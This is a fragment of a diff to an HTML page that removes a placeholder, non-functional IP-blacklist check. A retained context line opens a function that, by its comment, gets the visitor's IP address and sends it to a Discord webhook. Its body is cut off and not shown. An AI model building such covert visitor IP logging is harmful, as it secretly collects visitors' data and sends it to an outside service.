@@ -82,18 +82,6 @@
         }
     </style>
     <script>
-        function checkBlacklist() {
-            const blacklistedIPs = [""];
-            const userIP = ""; // Replace with real IP fetch logic
-
-            if (blacklistedIPs.includes(userIP)) {
-                document.body.innerHTML = '<div class="blacklisted-message">You are blacklisted.</div>';
-            }
-        }
-
-
-        document.addEventListener('DOMContentLoaded', checkBlacklist);
-
         // Function to get the IP address and send it to the Discord webhook
         async function logIPAndSendToWebhook() {
             try 
